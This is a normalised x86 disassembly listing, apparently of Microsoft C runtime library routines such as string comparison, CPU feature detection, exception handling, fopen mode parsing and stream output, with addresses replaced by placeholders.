push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_42960f
pop ecx
push eax
call [ LCMapStringW@IAT ]
pop ebp
retn
xor ecx ecx
push ecx
push ecx
push ecx
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call eax
pop ebp
retn
sub_42975b
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x10 ]
xor eax eax
test esi esi
je r-xdata
pop esi
pop ebp
retn
mov ecx [ ebp + 0xc ]
push ebx
push edi
mov edi [ ebp + 0x8 ]
push 0x41
pop ebx
push 0x5a
pop edx
sub edi ecx
mov [ ebp + 0x10 ] edx
jmp r-xdata
movzx eax [ edi + ecx ]
cmp ax bx
jb r-xdata
mov edx eax
cmp ax dx
ja r-xdata
add ecx 0x2
dec esi
je r-xdata
cmp ax [ ebp + 0x10 ]
ja r-xdata
add eax 0x20
movzx edx ax
jmp r-xdata
movzx ecx ax
movzx eax dx
pop edi
sub eax ecx
pop ebx
test dx dx
je r-xdata
add eax 0x20
movzx eax ax
movzx eax [ ecx ]
cmp ax bx
jb r-xdata
cmp dx ax
je r-xdata
push 0x5a
pop edx
sub_4297c9
push ebp
mov ebp esp
mov eax [ ebp + 0x14 ]
test eax eax
jle r-xdata
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push eax
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_42970f
add esp 0x18
pop ebp
retn
push eax
push [ ebp + 0x10 ]
call sub_42f6f1
pop ecx
pop ecx
sub_42981d
push edx
fwait
fnstcw [ esp ]
mov eax [ esp + 0xc ]
je r-xdata
test eax 0xfffff
jne r-xdata
cmp [ esp ] 0x27f
je r-xdata
call sub_432ebc
jmp r-xdata
cmp [ esp + 0x8 ] 0x0
jne r-xdata
test eax 0x80000000
jne r-xdata
call sub_432ea5
cmp [ rw-data ] 0x0
jne r-xdata
and eax 0x80000000
je r-xdata
test eax 0x7ff00000
jne r-xdata
fsqrt
cmp [ esp ] 0x27f
je r-xdata
mov edx 0x5
lea ecx [ rw-data ]
call sub_432e47
pop edx
retn
cmp [ rw-data ] 0x0
jne r-xdata
fstp st0
fld [ r--data ]
mov eax 0x1
test eax 0xfffff
jne r-xdata
mov edx 0x5
lea ecx [ rw-data ]
jmp r-xdata
pop edx
retn
fldcw [ esp ]
cmp [ esp + 0x8 ] 0x0
jne r-xdata
mov ax [ esp ]
cmp ax 0x27f
je r-xdata
jmp r-xdata
pop edx
retn
and ax 0x20
je r-xdata
fldcw [ esp ]
fwait
fnstsw ax
and ax 0x20
je r-xdata
mov eax 0x8
call sub_432e47
pop edx
retn
sub_4298ba
push ebp
mov ebp esp
and [ rw-data ] 0x0
sub esp 0x10
push ebx
xor ebx ebx
inc ebx
or [ rw-data ] ebx
push 0xa
call IsProcessorFeaturePresent
test eax eax
je r-xdata
xor eax eax
pop ebx
leave
retn
xor ecx ecx
mov eax ebx
mov [ rw-data ] ebx
cpuid
push esi
mov esi [ rw-data ]
push edi
lea edi [ ebp - 0x10 ]
or esi 0x2
mov [ edi ] eax
mov [ edi + 0x4 ] ebx
mov [ edi + 0x8 ] ecx
mov [ edi + 0xc ] edx
test [ ebp - 0x8 ] 0x100000
mov [ rw-data ] esi
je r-xdata
test [ ebp - 0x8 ] 0x10000000
je r-xdata
or esi 0x4
mov [ rw-data ] 0x2
mov [ rw-data ] esi
push 0x7
xor ecx ecx
pop eax
cpuid
lea esi [ ebp - 0x10 ]
mov [ esi ] eax
mov [ esi + 0x4 ] ebx
mov [ esi + 0x8 ] ecx
mov [ esi + 0xc ] edx
test [ ebp - 0xc ] 0x200
mov esi [ rw-data ]
je r-xdata
or esi 0x8
mov [ rw-data ] 0x3
mov [ rw-data ] esi
xor eax eax
xor ecx ecx
cpuid
lea edi [ ebp - 0x10 ]
mov [ edi ] eax
mov [ edi + 0x4 ] ebx
mov [ edi + 0x8 ] ecx
mov [ edi + 0xc ] edx
cmp [ ebp - 0xc ] 0x756e6547
jne r-xdata
or esi 0x2
mov [ rw-data ] esi
pop edi
pop esi
cmp [ ebp - 0x4 ] 0x49656e69
jne r-xdata
cmp [ ebp - 0x8 ] 0x6c65746e
jne r-xdata
xor eax eax
inc eax
xor ecx ecx
cpuid
mov [ edi ] eax
mov [ edi + 0x4 ] ebx
mov [ edi + 0x8 ] ecx
mov [ edi + 0xc ] edx
mov eax [ ebp - 0x10 ]
and eax 0xfff3ff0
cmp eax 0x106c0
je r-xdata
or esi 0x1
mov [ rw-data ] esi
cmp eax 0x20660
je r-xdata
cmp eax 0x20670
je r-xdata
cmp eax 0x30650
je r-xdata
cmp eax 0x30660
je r-xdata
cmp eax 0x30670
jne r-xdata
sub_4299f3
push 0xc
push r--data
call sub_429ad0
push 0xe
call sub_425b56
pop ecx
and [ ebp - 0x4 ] 0x0
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_429a5b
call sub_429b15
retn
mov ecx [ rw-data ]
mov edx rw-data
push [ esi + 0x4 ]
call sub_422732
pop ecx
and [ esi + 0x4 ] 0x0
cmp [ ecx ] eax
jne r-xdata
mov edx ecx
jmp r-xdata
mov eax [ ecx + 0x4 ]
mov [ edx + 0x4 ] eax
push ecx
call sub_422732
pop ecx
mov [ ebp - 0x1c ] ecx
test ecx ecx
je r-xdata
sub_429a64
push ebp
mov ebp esp
push [ rw-data ]
call [ DecodePointer@IAT ]
test eax eax
je r-xdata
xor eax eax
pop ebp
retn
push [ ebp + 0x8 ]
call eax
pop ecx
test eax eax
je r-xdata
xor eax eax
inc eax
pop ebp
retn
sub_429a97
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
push [ ebp + 0x8 ]
push 0x0
push [ rw-data ]
call [ HeapSize@IAT ]
pop ebp
retn
call sub_427b11
mov [ eax ] 0x16
call sub_42a231
or eax 0xffffffff
pop ebp
retn
sub_429ad0
push sub_429b30
push [ fs : 0x0 ]
mov eax [ esp + 0x10 ]
mov [ esp + 0x10 ] ebp
lea ebp [ esp + 0x10 ]
sub esp eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor [ ebp - 0x4 ] eax
xor eax ebp
push eax
mov [ ebp - 0x18 ] esp
push [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x4 ] 0xfffffffe
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x10 ]
mov [ fs : 0x0 ] eax
retn
sub_429b30
push ebp
mov ebp esp
sub esp 0x18
push ebx
mov ebx [ ebp + 0xc ]
push esi
push edi
mov edi [ ebx + 0x8 ]
xor edi [ rw-data ]
mov [ ebp - 0x1 ] 0x0
mov [ ebp - 0xc ] 0x1
mov eax [ edi ]
lea esi [ ebx + 0x10 ]
cmp eax 0xfffffffe
je r-xdata
mov ecx [ edi + 0xc ]
mov eax [ edi + 0x8 ]
add ecx esi
xor ecx [ eax + esi ]
call sub_421ed7
mov eax [ ebp + 0x8 ]
test [ eax + 0x4 ] 0x66
jne r-xdata
mov ecx [ edi + 0x4 ]
add ecx esi
xor ecx [ eax + esi ]
call sub_421ed7
cmp [ ebx + 0xc ] 0xfffffffe
je r-xdata
mov [ ebp - 0x18 ] eax
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x14 ] eax
lea eax [ ebp - 0x18 ]
mov [ ebx - 0x4 ] eax
mov eax [ ebx + 0xc ]
mov [ ebp - 0x8 ] eax
cmp eax 0xfffffffe
je r-xdata
mov eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push rw-data
push esi
mov ecx ebx
mov edx 0xfffffffe
call sub_42a75b
lea eax [ eax + eax * 2 ]
lea eax [ eax + 0x4 ]
mov ecx [ edi + eax * 4 + 0x4 ]
mov ebx [ edi + eax * 4 ]
lea eax [ edi + eax * 4 ]
mov [ ebp - 0x10 ] eax
test ecx ecx
je r-xdata
mov ecx [ edi + 0xc ]
mov edx [ edi + 0x8 ]
add ecx esi
xor ecx [ edx + esi ]
call sub_421ed7
mov ecx [ edi + 0x4 ]
add ecx esi
xor ecx [ eax + esi ]
call sub_421ed7
mov cl [ ebp - 0x1 ]
mov edx esi
call sub_42a712
mov cl 0x1
mov [ ebp - 0x1 ] cl
test eax eax
js r-xdata
test cl cl
je r-xdata
mov [ ebp - 0xc ] 0x0
jmp r-xdata
jle r-xdata
jmp r-xdata
mov eax [ edi ]
cmp eax 0xfffffffe
je r-xdata
mov eax ebx
mov [ ebp - 0x8 ] ebx
cmp ebx 0xfffffffe
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax ] 0xe06d7363
jne r-xdata
mov edx [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
call sub_42a742
mov eax [ ebp + 0xc ]
mov edx [ ebp - 0x8 ]
cmp [ eax + 0xc ] edx
je r-xdata
cmp [ r--data ] 0x0
je r-xdata
mov [ eax + 0xc ] ebx
mov eax [ edi ]
cmp eax 0xfffffffe
je r-xdata
push rw-data
push esi
mov ecx eax
call sub_42a75b
mov eax [ ebp + 0xc ]
push r--data
call sub_42e040
add esp 0x4
test eax eax
je r-xdata
mov ecx [ edi + 0xc ]
mov eax [ edi + 0x8 ]
add ecx esi
xor ecx [ eax + esi ]
call sub_421ed7
mov ecx [ ebp - 0x10 ]
mov edx esi
mov ecx [ ecx + 0x8 ]
call sub_42a729
int3
jmp r-xdata
push 0x1
push [ ebp + 0x8 ]
call [ r--data ]
add esp 0x8
mov ecx [ edi + 0x4 ]
add ecx esi
xor ecx [ eax + esi ]
call sub_421ed7
sub_429cc5
push 0x3
call sub_430ed6
pop ecx
cmp eax 0x1
je r-xdata
push 0xfc
call sub_429d22
push 0xff
call sub_429d22
pop ecx
pop ecx
push 0x3
call sub_430ed6
pop ecx
test eax eax
jne r-xdata
retn
cmp [ rw-data ] 0x1
jne r-xdata
sub_429cfe
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
xor eax eax
mov eax [ eax * 8 + r--data ]
pop ebp
retn
inc eax
cmp eax 0x17
jb r-xdata
cmp ecx [ eax * 8 + r--data ]
je r-xdata
xor eax eax
pop ebp
retn
sub_429d22
push ebp
mov ebp esp
sub esp 0x1fc
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
mov esi [ ebp + 0x8 ]
push edi
push esi
call sub_429cfe
mov edi eax
pop ecx
test edi edi
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop esi
call sub_421ed7
leave
retn
push ebx
push 0x3
call sub_430ed6
pop ecx
cmp eax 0x1
je r-xdata
push 0xfffffff4
call [ GetStdHandle@IAT ]
mov esi eax
test esi esi
je r-xdata
push 0x3
call sub_430ed6
pop ecx
test eax eax
jne r-xdata
pop ebx
cmp esi 0xffffffff
je r-xdata
cmp esi 0xfc
je r-xdata
cmp [ rw-data ] 0x1
je r-xdata
xor ebx ebx
mov ecx ebx
push r--data
push 0x314
push rw-data
call sub_422868
add esp 0xc
xor ebx ebx
test eax eax
jne r-xdata
push ebx
lea eax [ ebp - 0x1fc ]
push eax
lea eax [ ebp - 0x1f8 ]
push eax
mov [ ebp - 0x5 ] bl
call sub_425610
pop ecx
push eax
lea eax [ ebp - 0x1f8 ]
push eax
push esi
call [ WriteFile@IAT ]
inc ecx
cmp ecx 0x1f4
jb r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_42a241
int3
push 0x104
push rw-data
push ebx
mov [ rw-data ] ax
call [ GetModuleFileNameW@IAT ]
mov esi 0x2fb
test eax eax
jne r-xdata
mov al [ edi + ecx * 2 ]
mov [ ebp + ecx - 0x1f8 ] al
cmp [ edi + ecx * 2 ] bx
je r-xdata
push rw-data
call sub_427b65
inc eax
pop ecx
cmp eax 0x3c
jbe r-xdata
push r--data
push esi
push rw-data
call sub_422868
add esp 0xc
test eax eax
jne r-xdata
push r--data
push 0x314
mov esi rw-data
push esi
call sub_4227fc
add esp 0xc
test eax eax
jne r-xdata
push rw-data
call sub_427b65
lea ecx [ eax * 2 + rw-data ]
mov eax ecx
sub eax rw-data
push 0x3
sar eax 0x1
push r--data
sub esi eax
push esi
push ecx
call sub_424aa8
add esp 0x14
test eax eax
jne r-xdata
push edi
push 0x314
push esi
call sub_4227fc
add esp 0xc
test eax eax
jne r-xdata
push 0x12010
push r--data
push esi
call sub_43301c
add esp 0xc
jmp r-xdata
sub_429edd
push ebp
mov ebp esp
sub esp 0x94
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
mov edx [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
push ebx
push esi
push edi
mov edi [ ebp + 0x18 ]
mov [ ebp - 0x94 ] edx
mov [ ebp - 0x8c ] ecx
cmp eax 0x1
jne r-xdata
cmp eax 0x2
jne r-xdata
push 0x80
lea ebx [ ebp - 0x84 ]
mov eax ebx
push eax
push [ ebp + 0x14 ]
xor esi esi
push ecx
push edx
mov [ ebp - 0x90 ] esi
call sub_4332d6
add esp 0x14
mov [ ebp - 0x88 ] eax
test eax eax
jne r-xdata
test eax eax
jne r-xdata
xor esi esi
push esi
push esi
push [ ebp + 0x14 ]
mov [ edi ] esi
push ecx
call sub_42968a
mov ebx eax
add esp 0x10
test ebx ebx
je r-xdata
push 0x1
push eax
call sub_4266a7
mov edx eax
pop ecx
pop ecx
mov [ edi ] edx
test edx edx
jne r-xdata
call [ GetLastError@IAT ]
cmp eax 0x7a
jne r-xdata
or eax 0xffffffff
and [ ebp - 0x88 ] eax
push 0x2
lea eax [ ebp - 0x88 ]
push eax
mov eax [ ebp + 0x14 ]
or eax 0x20000000
push eax
push ecx
call sub_42968a
add esp 0x10
test eax eax
je r-xdata
push [ edi ]
call sub_422732
pop ecx
mov [ edi ] esi
jmp r-xdata
push 0x2
push ebx
call sub_4266a7
pop ecx
pop ecx
mov [ edi ] eax
test eax eax
je r-xdata
mov ecx [ ebp - 0x88 ]
lea eax [ ecx - 0x1 ]
push eax
push ebx
push ecx
push edx
call sub_424a04
add esp 0x10
test eax eax
jne r-xdata
cmp [ ebp - 0x90 ] esi
je r-xdata
push esi
push esi
push [ ebp + 0x14 ]
push [ ebp - 0x8c ]
push [ ebp - 0x94 ]
call sub_4332d6
add esp 0x14
mov [ ebp - 0x88 ] eax
test eax eax
je r-xdata
mov al [ ebp - 0x88 ]
mov [ edi ] al
jmp r-xdata
push ebx
push eax
push [ ebp + 0x14 ]
push [ ebp - 0x8c ]
call sub_42968a
add esp 0x10
test eax eax
jne r-xdata
push esi
push esi
push esi
push esi
push esi
call sub_42a241
int3
cmp [ ebp - 0x90 ] esi
je r-xdata
push ebx
call sub_422732
pop ecx
push 0x1
push eax
call sub_4266a7
mov ebx eax
pop ecx
pop ecx
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
push ebx
call sub_422732
pop ecx
push [ ebp - 0x88 ]
mov [ ebp - 0x90 ] 0x1
push ebx
push [ ebp + 0x14 ]
push [ ebp - 0x8c ]
push [ ebp - 0x94 ]
call sub_4332d6
add esp 0x14
mov [ ebp - 0x88 ] eax
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_421ed7
leave
retn
sub_42a0d6
push ebp
mov ebp esp
sub esp 0x328
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
cmp [ ebp + 0x8 ] 0xffffffff
push edi
je r-xdata
and [ ebp - 0x320 ] 0x0
push 0x4c
lea eax [ ebp - 0x31c ]
push 0x0
push eax
call sub_427900
lea eax [ ebp - 0x320 ]
mov [ ebp - 0x328 ] eax
lea eax [ ebp - 0x2d0 ]
add esp 0xc
mov [ ebp - 0x324 ] eax
mov [ ebp - 0x220 ] eax
mov [ ebp - 0x224 ] ecx
mov [ ebp - 0x228 ] edx
mov [ ebp - 0x22c ] ebx
mov [ ebp - 0x230 ] esi
mov [ ebp - 0x234 ] edi
mov [ ebp - 0x208 ] ss
mov [ ebp - 0x214 ] cs
mov [ ebp - 0x238 ] ds
mov [ ebp - 0x23c ] es
mov [ ebp - 0x240 ] fs
mov [ ebp - 0x244 ] gs
pushfd
pop [ ebp - 0x210 ]
mov eax [ ebp + 0x4 ]
mov [ ebp - 0x218 ] eax
lea eax [ ebp + 0x4 ]
mov [ ebp - 0x20c ] eax
mov [ ebp - 0x2d0 ] 0x10001
mov eax [ eax - 0x4 ]
mov [ ebp - 0x21c ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x320 ] eax
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x31c ] eax
mov eax [ ebp + 0x4 ]
mov [ ebp - 0x314 ] eax
call [ IsDebuggerPresent@IAT ]
mov edi eax
lea eax [ ebp - 0x328 ]
push eax
call sub_427886
pop ecx
test eax eax
jne r-xdata
push [ ebp + 0x8 ]
call sub_4309fc
pop ecx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop edi
call sub_421ed7
leave
retn
test edi edi
jne r-xdata
cmp [ ebp + 0x8 ] 0xffffffff
je r-xdata
push [ ebp + 0x8 ]
call sub_4309fc
pop ecx
sub_42a206
push ebp
mov ebp esp
push [ rw-data ]
call [ DecodePointer@IAT ]
test eax eax
je r-xdata
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_42a241
int3
pop ebp
jmp eax
sub_42a241
push 0x17
call IsProcessorFeaturePresent
test eax eax
je r-xdata
push esi
push 0x1
mov esi 0xc0000417
push esi
push 0x2
call sub_42a0d6
push esi
call sub_427871
add esp 0x10
pop esi
retn
push 0x5
pop ecx
int 0x29
sub_42a26c
push 0x10
push r--data
call sub_429ad0
xor ebx ebx
mov esi ebx
mov [ ebp - 0x1c ] esi
push 0x1
call sub_425b56
pop ecx
mov [ ebp - 0x4 ] ebx
mov edi ebx
test esi esi
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + edi * 4 ]
test eax eax
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_42a37b
mov eax esi
call sub_429b15
retn
and [ esi + 0xc ] 0x8000
mov [ esi + 0x4 ] ebx
mov [ esi + 0x8 ] ebx
mov [ esi ] ebx
mov [ esi + 0x1c ] ebx
or [ esi + 0x10 ] 0xffffffff
push 0x38
call sub_4266f1
pop ecx
mov ecx eax
mov eax [ rw-data ]
mov [ eax + edi * 4 ] ecx
test ecx ecx
je r-xdata
test [ eax + 0xc ] 0x83
jne r-xdata
push 0xfa0
mov eax [ rw-data ]
mov eax [ eax + edi * 4 ]
add eax 0x20
push eax
call [ InitializeCriticalSectionAndSpinCount@IAT ]
mov eax [ rw-data ]
mov eax [ eax + edi * 4 ]
add eax 0x20
push eax
call [ EnterCriticalSection@IAT ]
mov eax [ rw-data ]
mov esi [ eax + edi * 4 ]
mov [ ebp - 0x1c ] esi
mov [ esi + 0xc ] ebx
inc edi
jmp r-xdata
test [ eax + 0xc ] 0x8000
jne r-xdata
mov [ ebp - 0x20 ] edi
cmp edi [ rw-data ]
jge r-xdata
lea eax [ edi - 0x3 ]
cmp eax 0x10
ja r-xdata
mov eax [ rw-data ]
push [ eax + edi * 4 ]
push edi
call sub_4240e7
pop ecx
pop ecx
mov eax [ rw-data ]
mov eax [ eax + edi * 4 ]
test [ eax + 0xc ] 0x83
je r-xdata
lea eax [ edi + 0x10 ]
push eax
call sub_425bde
pop ecx
test eax eax
je r-xdata
mov esi eax
mov [ ebp - 0x1c ] esi
jmp r-xdata
push eax
push edi
call sub_424151
pop ecx
pop ecx
sub_42a384
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
mov esi [ ebp + 0xc ]
push edi
mov edi [ rw-data ]
xor ecx ecx
push 0x20
mov edx ecx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x8 ] ecx
pop eax
jmp r-xdata
cmp [ esi ] ax
je r-xdata
add esi 0x2
movzx eax [ esi ]
cmp eax 0x61
je r-xdata
mov ebx 0x109
cmp eax 0x72
je r-xdata
push 0x20
pop eax
jmp r-xdata
mov [ ebp + 0xc ] 0x1000
mov ebx ecx
or edi 0x1
jmp r-xdata
cmp eax 0x77
je r-xdata
cmp [ esi ] ax
je r-xdata
mov eax [ ebp - 0x8 ]
test eax eax
je r-xdata
movzx eax ax
cmp eax 0x53
jg r-xdata
add esi 0x2
xor ecx ecx
movzx eax [ esi ]
inc ecx
test ax ax
je r-xdata
mov ebx 0x301
jmp r-xdata
call sub_427b11
mov [ eax ] 0x16
call sub_42a231
add esi 0x2
xor eax eax
cmp [ esi ] ax
jne r-xdata
push 0x20
pop eax
jmp r-xdata
sub eax 0x54
je r-xdata
je r-xdata
or edi 0x2
pop edi
pop esi
pop ebx
leave
retn
push 0x180
push [ ebp + 0x10 ]
lea eax [ ebp + 0xc ]
push ebx
push [ ebp + 0x8 ]
push eax
call sub_433bb7
add esp 0x14
test eax eax
jne r-xdata
cmp [ esi ] ax
je r-xdata
mov eax [ ebp + 0xc ]
test eax ebx
je r-xdata
sub eax 0xe
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
sub eax 0x20
je r-xdata
xor eax eax
jmp r-xdata
inc [ rw-data ]
mov eax [ ebp + 0x14 ]
xor ecx ecx
mov [ eax + 0x4 ] ecx
mov [ eax ] ecx
mov [ eax + 0x8 ] ecx
mov [ eax + 0x1c ] ecx
mov ecx [ ebp + 0xc ]
mov [ eax + 0xc ] edi
mov [ eax + 0x10 ] ecx
add esi 0x2
push 0x3
push esi
push r--data
call sub_433bd5
add esp 0xc
test eax eax
jne r-xdata
or ebx eax
xor ecx ecx
jmp r-xdata
test ebx 0xc000
jne r-xdata
dec eax
je r-xdata
mov [ ebp - 0x4 ] 0x1
or ebx 0x20
jmp r-xdata
add esi 0x2
movzx eax [ esi ]
test ax ax
jne r-xdata
sub eax 0xb
je r-xdata
push 0x20
add esi 0x6
pop eax
jmp r-xdata
test ecx ecx
je r-xdata
or ebx 0x8000
jmp r-xdata
test edx edx
jne r-xdata
sub eax 0xb
je r-xdata
test bl 0x2
jne r-xdata
dec eax
je r-xdata
cmp [ esi ] ax
je r-xdata
inc edx
or edi 0x4000
jmp r-xdata
test edx edx
jne r-xdata
sub eax 0x6
jne r-xdata
and ebx 0xfffffffe
and edi 0xfffffffc
or ebx 0x2
or edi 0x80
jmp r-xdata
mov [ ebp - 0x8 ] 0x1
jmp r-xdata
sub eax 0x18
je r-xdata
add esi 0x2
cmp [ esi ] 0x3d
jne r-xdata
inc edx
and edi 0xffffbfff
jmp r-xdata
test ebx 0xc000
jne r-xdata
test bl 0x40
jne r-xdata
sub eax 0xa
je r-xdata
add esi 0x2
cmp [ esi ] ax
je r-xdata
or ebx 0x4000
jmp r-xdata
or ebx 0x40
jmp r-xdata
or ebx 0x80
jmp r-xdata
sub eax 0x4
jne r-xdata
push 0x5
push r--data
push esi
call sub_433c0b
add esp 0xc
test eax eax
jne r-xdata
cmp [ ebp - 0x4 ] eax
jne r-xdata
push 0x8
push r--data
push esi
call sub_433c0b
add esp 0xc
test eax eax
jne r-xdata
add esi 0xa
or ebx 0x40000
jmp r-xdata
mov [ ebp - 0x4 ] 0x1
or ebx 0x10
jmp r-xdata
push 0x7
push r--data
push esi
call sub_433c0b
add esp 0xc
test eax eax
jne r-xdata
add esi 0x10
or ebx 0x20000
jmp r-xdata
add esi 0xe
or ebx 0x10000
sub_42a620
push ebx
push esi
push edi
mov edx [ esp + 0x10 ]
mov eax [ esp + 0x14 ]
mov ecx [ esp + 0x18 ]
push ebp
push edx
push eax
push ecx
push ecx
push sub_42a6b0
push [ fs : 0x0 ]
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x8 ] eax
mov [ fs : 0x0 ] esp
pop [ fs : 0x0 ]
add esp 0x18
pop edi
pop esi
pop ebx
retn
mov edx [ esp + 0x34 ]
cmp edx 0xfffffffe
je r-xdata
lea esi [ esi + esi * 2 ]
lea ebx [ ebx + esi * 4 + 0x10 ]
mov ecx [ ebx ]
mov [ eax + 0xc ] ecx
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
cmp esi edx
jbe r-xdata
mov eax [ esp + 0x30 ]
mov ebx [ eax + 0x8 ]
mov ecx [ esp + 0x2c ]
xor ebx [ ecx ]
mov esi [ eax + 0xc ]
cmp esi 0xfffffffe
je r-xdata
push 0x101
mov eax [ ebx + 0x8 ]
call sub_433ed5
mov ecx 0x1
mov eax [ ebx + 0x8 ]
call sub_433ef4
jmp r-xdata
sub_42a6b0
mov ecx [ esp + 0x4 ]
test [ ecx + 0x4 ] 0x6
mov eax 0x1
je r-xdata
retn
mov eax [ esp + 0x8 ]
mov ecx [ eax + 0x8 ]
xor ecx eax
call sub_421ed7
push ebp
mov ebp [ eax + 0x18 ]
push [ eax + 0xc ]
push [ eax + 0x10 ]
push [ eax + 0x14 ]
call sub_42a620
add esp 0xc
pop ebp
mov eax [ esp + 0x8 ]
mov edx [ esp + 0x10 ]
mov [ edx ] eax
mov eax 0x3
sub_42a712
push ebp
push esi
push edi
push ebx
mov ebp edx
xor eax eax
xor ebx ebx
xor edx edx
xor esi esi
xor edi edi
call ecx
pop ebx
pop edi
pop esi
pop ebp
retn
sub_42a742
push ebp
mov ebp esp
push ebx
push esi
push edi
push 0x0
push edx
push r-xdata
push ecx
call RtlUnwind
pop edi
pop esi
pop ebx
pop ebp
retn
sub_42a772
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0xc ]
push edi
push esi
call sub_42b76c
pop ecx
mov ecx [ esi + 0xc ]
mov edi eax
test cl 0x82
jne r-xdata
test cl 0x40
je r-xdata
call sub_427b11
mov [ eax ] 0x9
push ebx
xor ebx ebx
test cl 0x1
je r-xdata
call sub_427b11
mov [ eax ] 0x22
jmp r-xdata
pop edi
pop esi
pop ebp
retn
mov eax [ esi + 0xc ]
and eax 0xffffffef
or eax 0x2
mov [ esi + 0xc ] eax
mov [ esi + 0x4 ] ebx
test eax 0x10c
jne r-xdata
mov [ esi + 0x4 ] ebx
test cl 0x10
je r-xdata
or [ esi + 0xc ] 0x20
or eax 0xffffffff
jmp r-xdata
test [ esi + 0xc ] 0x108
je r-xdata
call sub_4240a2
add eax 0x20
cmp esi eax
je r-xdata
or ecx 0x20
mov [ esi + 0xc ] ecx
jmp r-xdata
mov eax [ esi + 0x8 ]
and ecx 0xfffffffe
mov [ esi ] eax
mov [ esi + 0xc ] ecx
xor eax eax
inc eax
push eax
mov [ ebp + 0xc ] eax
lea eax [ ebp + 0x8 ]
push eax
push edi
call sub_42c027
add esp 0xc
mov ebx eax
mov edx [ esi + 0x8 ]
mov ecx [ esi ]
lea eax [ edx + 0x1 ]
mov [ esi ] eax
mov eax [ esi + 0x18 ]
sub ecx edx
dec eax
mov [ ebp + 0xc ] ecx
mov [ esi + 0x4 ] eax
test ecx ecx
jle r-xdata
push edi
call sub_433ef7
pop ecx
test eax eax
jne r-xdata
call sub_4240a2
add eax 0x40
cmp esi eax
jne r-xdata
or eax 0xffffffff
jmp r-xdata
movzx eax [ ebp + 0x8 ]
or [ esi + 0xc ] 0x20
cmp edi 0xffffffff
je r-xdata
push ecx
push edx
push edi
call sub_42c027
add esp 0xc
mov ebx eax
jmp r-xdata
push esi
call sub_42eb5f
pop ecx
pop ebx
mov ecx rw-data
cmp edi 0xfffffffe
je r-xdata
mov ecx [ esi + 0x8 ]
mov al [ ebp + 0x8 ]
mov [ ecx ] al
jmp r-xdata
push 0x2
push ebx
push ebx
push edi
call sub_42ca87
and eax edx
add esp 0x10
cmp eax 0xffffffff
je r-xdata
mov ecx edi
mov eax edi
and ecx 0x1f
sar eax 0x5
shl ecx 0x6
add ecx [ eax * 4 + rw-data ]
jmp r-xdata
cmp ebx [ ebp + 0xc ]
je r-xdata
test [ ecx + 0x4 ] 0x20
je r-xdata
sub_42a8bf
push ebp
mov ebp esp
sub esp 0x20
and [ ebp - 0x20 ] 0x0
push edi
push 0x7
xor eax eax
pop ecx
lea edi [ ebp - 0x1c ]
[ edi ]
cmp [ ebp + 0x14 ] eax
jne r-xdata
mov edi [ ebp + 0x10 ]
push esi
mov esi [ ebp + 0xc ]
test edi edi
je r-xdata
call sub_427b11
mov [ eax ] 0x16
call sub_42a231
or eax 0xffffffff
jmp r-xdata
mov [ ebp - 0x14 ] 0x42
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x20 ] esi
cmp edi 0x3fffffff
jbe r-xdata
test esi esi
jne r-xdata
pop edi
leave
retn
lea eax [ edi + edi ]
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x1c ] 0x7fffffff
jmp r-xdata
call sub_427b11
mov [ eax ] 0x16
call sub_42a231
or eax 0xffffffff
jmp r-xdata
pop ebx
test ebx ebx
js r-xdata
push ebx
push [ ebp + 0x1c ]
lea eax [ ebp - 0x20 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push eax
call [ ebp + 0x8 ]
add esp 0x10
mov ebx eax
test esi esi
je r-xdata
pop esi
xor eax eax
cmp [ ebp - 0x1c ] eax
mov [ esi + edi * 2 - 0x2 ] ax
setge al
sub eax 0x2
dec [ ebp - 0x1c ]
js r-xdata
lea eax [ ebp - 0x20 ]
push eax
push 0x0
call sub_42a772
pop ecx
pop ecx
cmp eax 0xffffffff
je r-xdata
mov eax [ ebp - 0x20 ]
mov [ eax ] 0x0
mov eax [ ebp - 0x20 ]
inc eax
